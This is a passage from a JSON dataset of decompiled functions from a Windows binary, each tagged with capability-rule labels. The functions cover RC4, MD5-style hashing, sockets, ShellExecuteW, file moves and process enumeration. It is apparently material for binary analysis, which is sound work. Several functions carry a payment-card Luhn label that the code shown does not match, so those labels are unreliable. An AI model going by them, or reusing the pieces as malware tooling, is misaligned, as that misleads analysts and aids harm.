+ uVar6;\n        uVar6 = (uVar2 * 0x10 | uVar2 >> 0x1c) + uVar5;\n        uVar2 = (uVar3 ^ uVar5 ^ uVar6) + piVar1[0xc] + -0x1924661b + uVar4;\n        uVar2 = (uVar2 * 0x800 | uVar2 >> 0x15) + uVar6;\n        uVar3 = (uVar5 ^ uVar6 ^ uVar2) + piVar1[0xf] + 0x1fa27cf8 + uVar3;\n        uVar4 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar2;\n        uVar3 = (uVar6 ^ uVar2 ^ uVar4) + piVar1[2] + -0x3b53a99b + uVar5;\n        uVar5 = (uVar3 >> 9 | uVar3 * 0x800000) + uVar4;\n        uVar3 = ((~uVar2 | uVar5) ^ uVar4) + *piVar1 + -0xbd6ddbc + uVar6;\n        uVar3 = (uVar3 * 0x40 | uVar3 >> 0x1a) + uVar5;\n        uVar2 = ((~uVar4 | uVar3) ^ uVar5) + piVar1[7] + 0x432aff97 + uVar2;\n        uVar6 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar3;\n        uVar2 = ((~uVar5 | uVar6) ^ uVar3) + piVar1[0xe] + -0x546bdc59 + uVar4;\n        uVar4 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar6;\n        uVar2 = ((~uVar3 | uVar4) ^ uVar6) + piVar1[5] + -0x36c5fc7 + uVar5;\n        uVar2 = (uVar2 >> 0xb | uVar2 * 0x200000) + uVar4;\n        uVar3 = ((~uVar6 | uVar2) ^ uVar4) + piVar1[0xc] + 0x655b59c3 + uVar3;\n        uVar5 = (uVar3 * 0x40 | uVar3 >> 0x1a) + uVar2;\n        uVar3 = ((~uVar4 | uVar5) ^ uVar2) + piVar1[3] + -0x70f3336e + uVar6;\n        uVar6 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar5;\n        uVar3 = ((~uVar2 | uVar6) ^ uVar5) + piVar1[10] + -0x100b83 + uVar4;\n        uVar3 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar6;\n        uVar2 = ((~uVar5 | uVar3) ^ uVar6) + piVar1[1] + -0x7a7ba22f + uVar2;\n        uVar4 = (uVar2 >> 0xb | uVar2 * 0x200000) + uVar3;\n        uVar2 = ((~uVar6 | uVar4) ^ uVar3) + piVar1[8] + 0x6fa87e4f + uVar5;\n        uVar5 = (uVar2 * 0x40 | uVar2 >> 0x1a) + uVar4;\n        uVar2 = ((~uVar3 | uVar5) ^ uVar4) + piVar1[0xf] + -0x1d31920 + uVar6;\n        uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar5;\n        uVar3 = ((~uVar4 | uVar2) ^ uVar5) + piVar1[6] + -0x5cfebcec + uVar3;\n        uVar6 = (uVar3 * 0x8000 | uVar3 >> 0x11) + uVar2;\n        uVar3 = ((~uVar5 | uVar6) ^ uVar2) + piVar1[0xd] + 0x4e0811a1 + uVar4;\n        uVar4 = (uVar3 >> 0xb | uVar3 * 0x200000) + uVar6;\n        uVar3 = ((~uVar2 | uVar4) ^ uVar6) + piVar1[4] + -0x8ac817e + uVar5;\n        uVar3 = (uVar3 * 0x40 | uVar3 >> 0x1a) + uVar4;\n        iStack28 = iStack28 + uVar3;\n        uVar2 = ((~uVar6 | uVar3) ^ uVar4) + piVar1[0xb] + -0x42c50dcb + uVar2;\n        uVar2 = (uVar2 * 0x400 | uVar2 >> 0x16) + uVar3;\n        uVar5 = ((~uVar4 | uVar2) ^ uVar3) + piVar1[2] + 0x2ad7d2bb + uVar6;\n        uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar2;\n        uVar3 = piVar1[9] + -0x14792c6f + uVar4 + ((~uVar3 | uVar5) ^ uVar2);\n        uStack44 = uStack44 + (uVar3 >> 0xb | uVar3 * 0x200000) + uVar5;\n        uStack40 = uStack40 + uVar5;\n        piVar1 = piVar1 + 0x10;\n        uStack36 = uStack36 + uVar2;\n    } while ((param_1 - piVar1) + param_2 != 0);\n    *(in_EAX + 8) = iStack28;\n    *(in_EAX + 0x10) = uStack40;\n    *(in_EAX + 0xc) = uStack44;\n    *(in_EAX + 0x14) = uStack36;\n    return;\n}\n",
        "token_count": 4851
    },
    "0040e4c0": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nuint32_t fcn.0040e4c0(uint8_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    *param_2 = 1;\n    uVar2 = *param_1;\n    uVar1 = uVar2 & 0x7f;\n    do {\n        if (-1 < uVar2) {\n            return uVar1;\n        }\n        uVar2 = param_1[*param_2];\n        iVar3 = *param_2 + 1;\n        *param_2 = iVar3;\n        uVar1 = uVar1 << 7 | uVar2 & 0x7f;\n    } while (iVar3 < 5);\n    return uVar1;\n}\n",
        "token_count": 182
    },
    "004101f8": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nvoid fcn.004101f8(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = *0x4229c8;\n    *0x4229c8 = *0x4229c4;\n    *0x4229c4 = *0x4229c0;\n    *0x4229cc = *0x4229cc << 0xb ^ *0x4229cc;\n    *0x4229c0 = *0x4229c0 ^ *0x4229c0 >> 0x13 ^ *0x4229cc ^ *0x4229cc >> 8;\n    *0x4229cc = uVar1;\n    return;\n}\n",
        "token_count": 155
    },
    "00401000": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid fcn.00401000(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    // [00] -r-x section size 135168 named .text\n    *0x422844 = 0xffffffff;\n    fcn.00403c8c(0x42e4a0);\n    fcn.00403c8c(0x42e2a0);\n    iVar1 = *0x42b5d0;\n    *0x42b330 = 0;\n    *0x42b5d0 = 0;\n    *0x42b32c = 0;\n    iVar2 = 0;\n    do {\n        iVar3 = iVar2 + 1;\n        fcn.00413a29(iVar2);\n        iVar2 = iVar3;\n    } while (iVar3 != 0xff);\n    if (0 < iVar1) {\n        fcn.00407ef4(3000);\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "00410390": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nuint * fcn.00410390(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    \n    iVar2 = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    do {\n        *(param_1 + iVar2 + 8) = iVar2;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x100);\n    iVar2 = 0;\n    uVar5 = 0;\n    puVar3 = param_1 + 2;\n    do {\n        cVar1 = *puVar3;\n        puVar4 = puVar3 + 1;\n        uVar5 = (cVar1 + *(param_2 + iVar2)) + uVar5 & 0xff;\n        *puVar3 = *(param_1 + uVar5 + 8);\n        *(param_1 + uVar5 + 8) = cVar1;\n        iVar2 = (iVar2 + 1) % param_3;\n        puVar3 = puVar4;\n    } while (param_1 + 0x42 != puVar4);\n    return param_1 + 0x42;\n}\n",
        "token_count": 303
    },
    "004103f6": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nint32_t fcn.004103f6(uint32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_4h;\n    uint32_t *var_8h;\n    uint8_t auStack284 [268];\n    \n    if (param_4 != param_2) {\n        if (param_5 < param_3) {\n            return -1;\n        }\n        fcn.00412aa3(param_4, param_2, param_3);\n    }\n    uVar3 = *var_8h;\n    uVar4 = var_8h[1];\n    iVar5 = 0;\n    do {\n        auStack284[iVar5] = *(var_8h + iVar5 + 8);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x100);\n    for (iVar5 = 0; iVar5 < param_3; iVar5 = iVar5 + 1) {\n        uVar3 = uVar3 + 1 & 0xff;\n        uVar2 = auStack284[uVar3];\n        uVar4 = uVar4 + uVar2 & 0xff;\n        uVar1 = auStack284[uVar4];\n        auStack284[uVar3] = uVar1;\n        auStack284[uVar4] = uVar2;\n        *(param_4 + iVar5) = *(param_4 + iVar5) ^ auStack284[uVar1 + uVar2 & 0xff];\n    }\n    return param_3;\n}\n",
        "token_count": 395
    },
    "00402570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402570(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    int32_t aiStack332 [79];\n    \n    fcn.004129e4(param_2, 0, param_3);\n    fcn.00412548(param_2, 0x422b80, param_3);\n    iVar1 = sub.KERNEL32.dll_CreateToolhelp32Snapshot(2, 0);\n    if (iVar1 != 0) {\n        aiStack332[0] = 0x128;\n        iVar1 = sub.KERNEL32.dll_Process32First(iVar1, aiStack332);\n        while( true ) {\n            if (iVar1 == 0) break;\n            if (aiStack332[0] == unaff_ESI) {\n                fcn.00412548();\n                break;\n            }\n            iVar1 = sub.KERNEL32.dll_Process32Next();\n        }\n        sub.KERNEL32.dll_CloseHandle();\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00403c36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403c36(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    \n    if ((param_2 == 0) || (param_1 == 0)) {\n        uVar2 = 0xffffffff;\n    }\n    else if (((param_3 & 0xfffffff7) == 0x10) || (uVar2 = 0xffffffff,  param_3 == 0x20)) {\n        uVar1 = fcn.00402e68(param_1, param_1 + 0xf0, param_2, param_3);\n        *(param_1 + 0x1e0) = uVar1;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 184
    },
    "00403cb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403cb2(uint param_1, uint param_2, uint8_t *param_3, uint8_t *param_4, int32_t param_5, int32_t param_6)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t auStack44 [28];\n    \n    fcn.00412aa3(auStack44, param_2, 0x10);\n    if (param_6 == 0) {\n        uVar4 = 0;\n        puVar3 = param_4 + param_5;\n        for (; param_4 != puVar3; param_4 = param_4 + 1) {\n            if (uVar4 == 0) {\n                fcn.00403047(param_1, auStack44, auStack44);\n            }\n            uVar1 = auStack44[uVar4];\n            uVar2 = *param_3;\n            auStack44[uVar4] = uVar1 ^ uVar2;\n            *param_4 = uVar1 ^ uVar2;\n            uVar4 = uVar4 + 1 & 0xf;\n            param_3 = param_3 + 1;\n        }\n    }\n    else if (param_6 == 1) {\n        uVar4 = 0;\n        puVar3 = param_4 + param_5;\n        for (; param_4 != puVar3; param_4 = param_4 + 1) {\n            if (uVar4 == 0) {\n                fcn.00403047(param_1, auStack44, auStack44);\n            }\n            uVar1 = *param_3;\n            uVar2 = auStack44[uVar4];\n            auStack44[uVar4] = uVar1;\n            uVar4 = uVar4 + 1 & 0xf;\n            *param_4 = uVar1 ^ uVar2;\n            param_3 = param_3 + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 463
    },
    "00404141": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404141(int32_t param_1, uint8_t param_2, int32_t param_3)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    do {\n        uVar2 = (*(param_1 + iVar3) * param_2 + 0x32) / 100;\n        if (uVar2 == 0) {\n            uVar2 = 1;\n        }\n        else if (0xff < uVar2) {\n            uVar2 = 0xff;\n        }\n        puVar1 = iVar3 + 0x422e60;\n        iVar3 = iVar3 + 1;\n        *(param_3 + *puVar1) = uVar2;\n    } while (iVar3 != 0x40);\n    return;\n}\n",
        "token_count": 193
    },
    "00404190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00404190(void)\n\n{\n    *0x42b260 = 0xffdb;\n    *0x42b262 = 0x84;\n    *0x42b264 = 0;\n    *0x42b2a5 = 1;\n    fcn.00404141(0x422280, *0x428000, 0x42b265);\n    fcn.00404141(0x422240, *0x428000, 0x42b2a6);\n    return;\n}\n",
        "token_count": 119
    },
    "00404342": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00404342(uint param_1, uchar param_2, uint8_t *param_3, int32_t param_4, int32_t param_5)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint uStack20;\n    \n    uStack20._0_2_ = CONCAT11(1, param_2);\n    uStack20 = uStack20;\n    iVar5 = 0;\n    do {\n        param_3 = param_3 + 1;\n        iVar4 = 0;\n        while( true ) {\n            cVar2 = iVar4;\n            uStack20._2_2_ = uStack20._2_2_ + iVar4;\n            iVar1 = iVar5 + iVar4;\n            iVar4 = iVar4 + 1;\n            if (*param_3 < cVar2 + 1U) break;\n            puVar3 = iVar1 + param_4;\n            *(param_5 + 2 + *puVar3 * 4) = uStack20._2_2_;\n            *(param_5 + *puVar3 * 4) = uStack20._1_1_;\n        }\n        uStack20._0_2_ = CONCAT11(uStack20._1_1_ + '\\x01', uStack20);\n        uStack20 = uStack20;\n        uStack20 = CONCAT22(uStack20._2_2_ * 2, uStack20);\n        iVar5 = iVar1;\n    } while (uStack20._1_1_ != '\\x11');\n    return uStack20;\n}\n",
        "token_count": 383
    },
    "004043b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004043b2(void)\n\n{\n    fcn.00404342(0x422224, 0x422218, 0x42b060);\n    fcn.00404342(0x422204, 0x4221f8, 0x42b020);\n    fcn.00404342(0x4221e4, 0x422140, 0x42ac20);\n    fcn.00404342(0x422124, 0x422080, 0x42a820);\n    return;\n}\n",
        "token_count": 124
    },
    "004044bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004044bb(void)\n\n{\n    double dVar1;\n    double dVar2;\n    uint8_t uVar3;\n    float fVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    double *pdVar9;\n    double adStack76 [8];\n    \n    iVar7 = 0;\n    puVar8 = 0x422020;\n    pdVar9 = adStack76;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *pdVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        pdVar9 = pdVar9 + 4;\n    }\n    do {\n        fVar4 = *0x422ea0;\n        dVar1 = *(adStack76 + iVar7);\n        iVar5 = 0;\n        do {\n            uVar6 = iVar7 + iVar5;\n            dVar2 = adStack76[iVar5];\n            iVar5 = iVar5 + 1;\n            uVar6 = uVar6 & 0xff;\n            uVar3 = *(*(uVar6 + 0x422e60) + 0x42b2a6);\n            *(uVar6 * 4 + 0x428300) = 1.0 / (dVar1 * *(*(uVar6 + 0x422e60) + 0x42b265) * dVar2 * fVar4);\n            *(uVar6 * 4 + 0x428200) = 1.0 / (dVar1 * uVar3 * dVar2 * fVar4);\n        } while (iVar5 != 8);\n        iVar7 = iVar7 + 8;\n    } while (iVar7 != 0x40);\n    return;\n}\n",
        "token_count": 414
    },
    "004048f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004048f3(uint16_t param_1, uint16_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iStack36;\n    \n    iVar2 = *0x4281e4;\n    uVar4 = 0;\n    iStack36 = 0;\n    uVar3 = *0x42e200;\n    do {\n        uVar1 = uVar4 + 8;\n        puVar5 = (uVar3 * param_2 + param_1) * 3 + iStack36 + iVar2;\n        do {\n            uVar9 = puVar5[2];\n            uVar7 = puVar5[1];\n            uVar6 = uVar4;\n            uVar8 = *puVar5;\n            uVar4 = uVar4 + 1;\n            puVar5 = puVar5 + 3;\n            *(uVar6 + 0x4281a0) =\n                 (*(uVar7 * 4 + 0x42a000) + *(uVar9 * 4 + 0x42a400) + *(uVar8 * 4 + 0x429c00) >> 0x10) + -0x80;\n            *(uVar6 + 0x428160) = *(uVar7 * 4 + 0x429400) + *(uVar9 * 4 + 0x429800) + *(uVar8 * 4 + 0x429000) >> 0x10;\n            *(uVar6 + 0x428120) = *(uVar7 * 4 + 0x428800) + *(uVar9 * 4 + 0x428c00) + *(uVar8 * 4 + 0x428400) >> 0x10;\n        } while (uVar4 != uVar1);\n        iStack36 = iStack36 + uVar3 * 3;\n    } while (uVar4 != 0x40);\n    return;\n}\n",
        "token_count": 504
    },
    "004051b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.004051b5(uint32_t param_1, uint param_2, ushort *param_3)\n\n{\n    uint *puVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    \n    iVar3 = sub.WS2_32.dll_gethostbyname(param_1);\n    if (iVar3 != 0) {\n        fcn.004129e4(param_3, 0, 0x10);\n        puVar1 = *(iVar3 + 0xc);\n        *param_3 = 2;\n        *(param_3 + 2) = **puVar1;\n        uVar2 = sub.WS2_32.dll_htons(param_1 & 0xffff);\n        param_3[1] = uVar2;\n    }\n    return iVar3 != 0;\n}\n",
        "token_count": 179
    },
    "00405959": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405959(void)\n\n{\n    ulong uVar1;\n    uchar auStack412 [412];\n    \n    uVar1 = sub.WS2_32.dll_WSAStartup(0x202, auStack412);\n    if (uVar1 != 0) {\n    // WARNING: Subroutine does not return\n        sub.KERNEL32.dll_ExitProcess(0);\n    }\n    sub.KERNEL32.dll_InitializeCriticalSection(0x42b314, uVar1 >> 0x20);\n    return;\n}\n",
        "token_count": 114
    },
    "00405999": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405999(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (param_1 != NULL) {\n        if (-1 < *param_1) {\n            uVar1 = sub.WS2_32.dll_shutdown(*param_1, 2);\n            sub.WS2_32.dll_closesocket(*param_1, uVar1);\n        }\n        *param_1 = -1;\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00405cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00405cc4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack296;\n    uint uStack292;\n    uint uStack288;\n    int32_t iStack284;\n    \n    do {\n        iStack284 = param_1;\n        uStack288 = 1;\n        iStack296 = param_2;\n        uStack292 = 0;\n        if (param_2 != 0) {\n            iVar1 = sub.WS2_32.dll_select(param_1 + 1, 0, &uStack288, 0, &iStack296);\n            if (iVar1 == 0) goto code_r0x00405d57;\n            break;\n        }\n        iVar1 = sub.WS2_32.dll_select(param_1 + 1, 0, &uStack288, 0, 0);\n    } while (iVar1 == 0);\n    if (iVar1 < 0) {\ncode_r0x00405d57:\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = sub.WS2_32.dll___WSAFDIsSet(param_1, &uStack288);\n        uVar2 = uVar2 & 0xffffff00 | uVar2 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 309
    },
    "00405ee7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00405ee7(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    int32_t iStack268;\n    \n    iVar3 = 3;\n    while( true ) {\n        while( true ) {\n            uStack272 = 1;\n            iStack268 = param_1;\n            uStack280 = 0x1e;\n            uStack276 = 0;\n            uVar1 = sub.WS2_32.dll_select(param_1 + 1, &uStack272, 0, 0, &uStack280);\n            if (uVar1 != 0) {\n                uVar2 = uVar1 & 0xffffff00;\n                if (-1 < uVar1) {\n                    uVar1 = sub.WS2_32.dll___WSAFDIsSet();\n                    uVar2 = uVar1 & 0xffffff00 | uVar1 != 0;\n                }\n                return uVar2;\n            }\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = fcn.00405d7d();\n        if (iVar3 == -1) break;\n        iVar3 = 3;\n    }\n    fcn.00405999();\n    return 0;\n}\n",
        "token_count": 315
    },
    "00406c2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00406c2a(uint param_1)\n\n{\n    uchar auStack2076 [1008];\n    uchar auStack1068 [1032];\n    uint uStack36;\n    uint uStack16;\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack2076, 0x204);\n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, uStack16, 0x204, auStack1068, 0x204);\n    sub.SHELL32.DLL_ShellExecuteW(0, 0, auStack2076, auStack1068, 0, uStack36);\n    return;\n}\n",
        "token_count": 167
    },
    "00406e7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "move file"
        ],
        "decompiled_code": "\nuint32_t fcn.00406e7f(uint param_1)\n\n{\n    uint32_t uVar1;\n    uchar auStack2076 [1008];\n    uchar auStack1068 [1052];\n    uint uStack16;\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack2076, 0x204);\n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, uStack16, 0x204, auStack1068, 0x204);\n    uVar1 = sub.KERNEL32.dll_MoveFileW(auStack2076, auStack1068);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 176
    },
    "00407302": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00407302(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    int32_t iVar6;\n    bool bVar7;\n    uchar auStack2116 [1056];\n    uchar auStack1060 [1020];\n    uint uStack40;\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack1060, 0x204);\n    iVar1 = sub.msvcrt.dll__wfopen(auStack1060, 0x422f44);\n    if (iVar1 == 0) {\n        return false;\n    }\n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, unaff_EBX, 0x204, auStack2116, 0x204);\n    bVar7 = false;\n    iVar2 = sub.msvcrt.dll__wfopen(auStack2116, 0x422f5c);\n    if (iVar2 == 0) goto code_r0x00407444;\n    iVar5 = 9;\n    iVar6 = 0x8000;\n    do {\n        iVar3 = sub.msvcrt.dll_malloc(iVar6);\n        if (iVar3 != 0) goto code_r0x004073db;\n        iVar6 = iVar6 >> 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    bVar7 = false;\n    goto code_r0x0040743c;\n    while (iVar4 = sub.msvcrt.dll_fwrite(iVar3, 1, iVar5, iVar2),  iVar5 == iVar4) {\ncode_r0x004073db:\n        iVar5 = sub.msvcrt.dll_fread(iVar3, 1, iVar6, iVar1);\n        if (iVar5 < 1) {\n            bVar7 = (*(iVar1 + 0xc) & 0x30) == 0x10;\n            goto code_r0x0040742b;\n        }\n    }\n    bVar7 = false;\ncode_r0x0040742b:\n    sub.msvcrt.dll_free(iVar3);\ncode_r0x0040743c:\n    sub.msvcrt.dll_fclose(iVar2);\ncode_r0x00407444:\n    sub.msvcrt.dll_fclose(iVar1);\n    if (!bVar7) {\n        fcn.00406e04(uStack40);\n    }\n    return bVar7;\n}\n",
        "token_count": 582
    },
    "004074c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004074c5(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uStack1104;\n    uchar *puStack1100;\n    uint uStack1096;\n    uint uStack1088;\n    uint uStack1084;\n    uchar auStack1044 [1040];\n    \n    uStack1096 = 0x204;\n    uStack1104 = 0x204;\n    puStack1100 = auStack1044;\n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1);\n    iVar1 = sub.KERNEL32.dll_GetFileAttributesExW(auStack1044, 0, &uStack1104);\n    if (iVar1 == 0) {\n        uStack1084 = 0xffffffff;\n        uStack1088 = 0xffffffff;\n    }\n    return CONCAT44(uStack1088, uStack1084);\n}\n",
        "token_count": 203
    },
    "00407ab6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "create directory"
        ],
        "decompiled_code": "\nuint32_t fcn.00407ab6(uint param_1)\n\n{\n    uint32_t uVar1;\n    uchar auStack1044 [1040];\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack1044, 0x204);\n    uVar1 = sub.KERNEL32.dll_CreateDirectoryW(auStack1044, 0);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 117
    },
    "00407b16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00407b16(char *param_1)\n\n{\n    char cVar1;\n    char cVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uchar *puVar6;\n    uchar auStack528 [516];\n    \n    uVar4 = 0xffffffff;\n    pcVar5 = param_1;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    if (~uVar4 - 1 < 0x204) {\n        fcn.00412548(auStack528, param_1, 0x204);\n        puVar6 = auStack528;\n        do {\n            puVar3 = fcn.00412740(puVar6, 0x5c);\n            if (puVar3 == NULL) {\n                return 1;\n            }\n            cVar2 = '\\x01';\n            if (puVar3 != puVar6) {\n                *puVar3 = 0;\n                cVar1 = fcn.0040729c(auStack528);\n                cVar2 = '\\x01';\n                if (cVar1 == '\\0') {\n                    cVar2 = fcn.00407ab6(auStack528);\n                }\n                *puVar3 = 0x5c;\n            }\n            puVar6 = puVar3 + 1;\n        } while (cVar2 != '\\0');\n    }\n    return 0;\n}\n",
        "token_count": 363
    },
    "00407c77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00407c77(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack1060 [1044];\n    \n    iVar1 = sub.KERNEL32.dll_GetModuleFileNameW(0, auStack1060, param_2);\n    sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0, auStack1060, 0xffffffff, param_1, 0x204, 0, 0);\n    if ((iVar1 < 1) || (param_2 <= iVar1)) {\n        fcn.004129e4(param_1, 0, param_2);\n        uVar2 = 0;\n    }\n    else {\n        *(param_1 + iVar1 * 2) = 0;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 202
    },
    "00407d7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
